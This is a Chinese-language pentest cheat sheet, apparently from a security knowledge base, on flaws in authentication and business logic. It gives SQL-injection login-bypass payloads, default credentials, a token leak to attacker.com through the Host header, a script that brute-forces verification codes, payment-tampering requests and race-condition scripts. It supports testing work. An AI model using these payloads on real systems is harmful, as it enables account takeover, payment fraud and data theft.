# 认证与业务逻辑漏洞参考

## 目录
- [1. 认证绕过](#1-认证绕过)
- [2. 密码重置漏洞](#2-密码重置漏洞)
- [3. 验证码漏洞](#3-验证码漏洞)
- [4. Session与Cookie安全](#4-session与cookie安全)
- [5. 越权漏洞](#5-越权漏洞)
- [6. 支付逻辑漏洞](#6-支付逻辑漏洞)
- [7. 条件竞争](#7-条件竞争)
- [8. 其他逻辑漏洞](#8-其他逻辑漏洞)

---

## 1. 认证绕过

### 1.1 SQL注入绕过登录

```
' OR '1'='1'--
' OR 1=1--
admin'--
' OR '1'='1'/*
' OR 1=1#
'='
' OR 'a'='a
" OR ""="
' OR 1=1-- -
' UNION SELECT NULL,NULL,NULL-- -
1' or '1'='1
admin'/*          (MySQL注释截断)
' || '1'='1      (Oracle)
```

### 1.2 万能密码
```
' OR '1'='1'/*
' OR '1'='1'#
admin' or 1=1/*
admin' or '1'='1
' or 1=1--
```

### 1.3 账号枚举

```
# 注册/登录时的差异响应
正常: "用户名或密码错误" (不区分)
枚举: "用户名不存在" / "密码错误" (区分)

# 测试方法:
1. 注册已知存在的用户名 → "该用户名已注册"
2. 登录不存在的用户名 → "用户名不存在"
3. 找回密码 → "该手机号/邮箱未注册"
4. 验证码发送 → 不同用户不同提示
```

### 1.4 默认口令

```
# 常见默认口令
admin:admin / admin:123456 / admin:admin123
test:test / test:123456
root:root / root:toor
guest:guest
manager:manager
support:support
info:info

# CMS默认
WordPress: admin/admin
Drupal: admin/admin
Joomla: admin/admin
Tomcat: tomcat/tomcat, admin/admin, manager/manager
```

---

## 2. 密码重置漏洞

### 2.1 步骤跳过

```
正常流程: 1.输入账号 → 2.验证身份(验证码/邮箱) → 3.设置新密码

攻击方法:
- 直接请求第3步: POST /reset/password?token=xxx → 跳过验证
- 修改参数: step=3 (跳过step=1,2)
- 并发请求: 同时发送验证码请求和重置请求
```

### 2.2 凭证可控

```
# 手机号篡改
POST /reset/send_code
{"phone": "13800138000"}  → 修改为自己的手机号

# 邮箱篡改
POST /reset/send_email
{"email": "attacker@evil.com"}

# Token可预测
观察Token格式: MD5(手机号)? 时间戳? 递增ID?
```

### 2.3 Host头注入

```
POST /reset/send_email HTTP/1.1
Host: attacker.com

# 服务器可能用Host头构造重置链接:
# https://attacker.com/reset?token=xxx → Token泄露给攻击者
```

### 2.4 Token复用/不过期

```
# Token使用一次后未失效 → 可重复使用
# Token有效期为1年 → 可长期使用
# Token与Session绑定 → 登录后Token仍有效
```

---

## 3. 验证码漏洞

### 3.1 验证码回显

```http
POST /login HTTP/1.1
{"username":"admin","password":"123456","captcha":"8394"}

HTTP/1.1 200 OK
{"code":0,"msg":"验证码错误: 正确验证码为 8395"}
```

### 3.2 验证码删除参数

```
# 删除captcha参数
POST /login
{"username":"admin","password":"123456"}
→ 成功(后端未校验)
```

### 3.3 万能验证码

```
# 常见万能码
0000 / 1234 / 8888 / abcd
# 开发者调试时留下的后门
```

### 3.4 验证码爆破

```python
# 检测: 4位纯数字 → 10000种可能
# 绕过: 无频率限制 / 验证码不过期 / 多账号并发
import requests

for code in range(10000):
    r = requests.post("https://target.com/api/verify", json={"code": f"{code:04d}"})
    if '"success"' in r.text:
        print(f"[!] 验证码: {code:04d}")
        break
```

### 3.5 验证码复用

```
# 同一验证码可用于多次验证
# 不同接口可使用同一验证码 (登录验证码用于注册)
```

### 3.6 短信/邮件轰炸

```
# 无频率限制 → 无限发送短信/邮件
# 绕过: X-Forwarded-For 随机IP / 多手机号 / +86前缀
```

---

## 4. Session与Cookie安全

### 4.1 Session固定

```
1. 攻击者获取一个有效Session: SID=abc123
2. 诱导受害者使用该Session访问 (通过URL/链接)
3. 受害者登录后,Session提升权限
4. 攻击者使用同一Session获得认证

# 测试: 登录前后Session是否变化?
```

### 4.2 Session预测

```
# 检查Session格式
- 纯数字递增 → 可预测
- 时间戳 → 可预测
- 弱随机数 → 可预测
- Base64编码 → 解码查看
```

### 4.3 Cookie属性缺失

```
缺失 HttpOnly → XSS可读取Cookie
缺失 Secure → HTTP传输明文
缺失 SameSite → CSRF攻击
缺失 Path → 子路径可访问
Domain过宽 → 子域名可访问
```

### 4.4 并发Session

```
# 登出后Session是否失效?
# 多设备登录是否互踢?
# 管理员和普通用户能否同时使用同一账号?
```

---

## 5. 越权漏洞

### 5.1 水平越权 (IDOR)

```
测试方法:
1. 注册两个账号 A 和 B
2. 账号A执行操作 → 抓包
3. 替换A的ID为B的ID
4. 保持A的Token/Cookie → 请求
5. 成功 → 水平越权

关键测试点:
- URL中的ID: /api/users/123/profile
- 参数中的ID: ?userId=123
- Body中的ID: {"targetUserId": 123}
- Header中的ID: X-User-Id: 123
- 嵌套资源: /api/orders/456/items (不同用户)
- 隐藏参数: 翻包查看所有字段
```

### 5.2 垂直越权

```
测试方法:
1. 普通用户Token → 访问管理员接口
2. 低权限角色 → 执行高权限操作

常见垂直越权:
- /admin/* 后台接口
- /api/admin/* 管理API
- /manage/* 管理功能
- 角色切换: {"role":"user"} → {"role":"admin"}
- 权限字段: {"permission":1} → {"permission":0}
```

### 5.3 未授权访问

```
测试方法:
1. 不带任何认证信息 → 访问接口
2. 带无效Token → 对比响应差异
3. 未登录直接访问后台页面
4. 直接访问API路径

常见未授权:
- /api/user/list (用户列表)
- /api/config (系统配置)
- /api/statistics (统计数据)
- /api/export (数据导出)
- /admin/ (管理后台)
- /swagger-ui.html (API文档)
```

---

## 6. 支付逻辑漏洞

### 6.1 金额篡改

```http
POST /api/order/create
{
    "goodsId": 1001,
    "quantity": 1,
    "price": 0.01,        ← 原价999.00
    "totalAmount": 0.01
}
```

### 6.2 数量篡改

```http
POST /api/order/create
{
    "goodsId": 1001,
    "quantity": -1,        ← 负数
    "price": 999.00
}
→ 如果后端用 quantity*price 计算,可能退款
```

### 6.3 优惠券/折扣叠加

```
- 同一优惠券使用多次
- 多张优惠券叠加使用
- 优惠券+折扣+满减同时使用
- 优惠券用于限制外的商品
- 已使用的优惠券再次使用
```

### 6.4 并发支付

```python
# 多线程同时支付,利用时间差
import threading, requests

def pay():
    requests.post("https://target.com/api/pay", json={
        "orderId": "ORD001",
        "amount": 1.00
    })

threads = [threading.Thread(target=pay) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
# 检查: 余额是否只扣一次? 商品是否多发?
```

### 6.5 支付回调篡改

```
# 伪造支付成功回调
POST /api/payment/callback
{
    "orderId": "ORD001",
    "status": "success",
    "amount": 999.00
}
# 如果回调未验签 → 免费获取商品
```

---

## 7. 条件竞争

### 7.1 常见竞争场景

```
- 优惠券领取: 并发请求 → 领取多张
- 积分兑换: 并发兑换 → 扣一次分得多个
- 限量秒杀: 并发下单 → 超卖
- 密码修改: 并发修改 → 旧密码可用
- 验证码: 并发验证 → 同一验证码多次使用
- 转账: 并发转账 → 余额只扣一次
```

### 7.2 利用脚本

```python
import threading, requests

url = "https://target.com/api/coupon/claim"
cookies = {"session": "your_session"}
data = {"couponId": "CPN001"}

threads = []
for _ in range(50):
    t = threading.Thread(target=lambda: requests.post(url, json=data, cookies=cookies))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# 检查是否成功领取多张
r = requests.get("https://target.com/api/coupon/my", cookies=cookies)
print(r.text)
```

---

## 8. 其他逻辑漏洞

### 8.1 密码修改逻辑

```
- 修改密码不验证旧密码
- 修改密码时手机号可改为自己的 → 接收验证码 → 改密码
- 修改邮箱时发送确认到新邮箱 → 接管账号
```

### 8.2 注册逻辑

```
- 注册时注入: username=admin'-- → 注册管理员账号
- 手机号注册: 使用他人手机号 + 自己验证码 (如果验证码漏洞)
- 邮箱注册: 大小写差异 Test@test.com vs test@test.com
- 用户名枚举: 注册时提示"已存在"
```

### 8.3 隐私泄露

```
- 用户搜索: 可通过手机号/邮箱搜索到用户
- 通讯录匹配: 上传通讯录 → 返回注册用户
- 密码找回: 输入手机号 → 显示部分信息(尾号)
- API分页: X-Total-Count 泄露用户总数
```

### 8.4 工作流绕过

```
- 跳过审核步骤: 提交 → 直接访问审核通过后的页面
- 状态篡改: {"status": "pending"} → {"status": "approved"}
- 订单状态: {"status": "unpaid"} → {"status": "paid"}
```

---

## 相关参考与组合链

| 本文件漏洞 | 组合链下一环 | 参考文件 |
|-----------|-------------|---------|
| 验证码爆破/绕过 | 登录目标账号 → 越权访问数据 | [api-security.md](api-security.md) §BOLA/IDOR |
| 密码重置接管 | 登录后调用API → 批量修改信息 | [api-security.md](api-security.md) §批量赋值 |
| Session固定/预测 | 获取Admin Session → 管理后台 | [vuln/xss.md](vuln/xss.md) |
| 弱口令/默认口令 | 登录管理后台 → 文件上传 → RCE | [vuln/upload.md](vuln/upload.md) |
| 支付漏洞(负数) | 提现/退款 → 资金损失 | 本文件 §支付逻辑漏洞 |
| 越权获取凭证 | 用凭证访问云API → AK泄露 | [cloud-security.md](cloud-security.md) §AK/SK泄露检测 |
| Cookie属性缺失(HttpOnly) | XSS窃取Cookie → 账号接管 | [vuln/xss.md](vuln/xss.md) |
| 条件竞争(领券) | 多张优惠券 → 支付时叠加使用 | 本文件 §支付逻辑漏洞 |

